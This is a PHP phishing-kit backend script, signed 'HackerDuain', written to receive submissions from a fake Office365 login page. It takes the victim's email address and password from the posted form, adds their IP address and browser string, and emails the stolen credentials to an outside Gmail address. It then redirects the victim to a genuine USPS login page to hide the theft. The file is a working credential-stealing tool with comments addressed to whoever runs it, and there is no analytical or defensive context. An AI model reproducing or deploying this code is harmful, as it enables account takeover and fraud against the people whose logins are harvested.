<?php
###################################
// Don't change anything here
// Created By HackerDuain
###################################


$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message  = "==================+[ Office365 Details ]+==================\n";
$message .= "Email Address : ".$_POST['login']."\n";
$message .= "Password    : ".$_POST['passwd']."\n";
$message .= "---------------Good-----------------\n";
$message .= "IP: ".$ip."\n";
$message .= "User-Agent: ".$browser."\n";
$message .= "---------------HackerDuain-----------------\n";

$subject = "Office365-SO";
$headers = "From: HackerDuain \n" .
$headers .= "To: The Receiver <terrydarapmarn@gmail.com>\n" .
$headers .= "MIME-Version: 1.0\n";
{
mail($send,$subject,$message,$headers);
}

//Location: The location where the user will be redirected after the script executes the commands. You can change it.
header("Location:  https://reg.usps.com/entreg/LoginAction_input?");
?>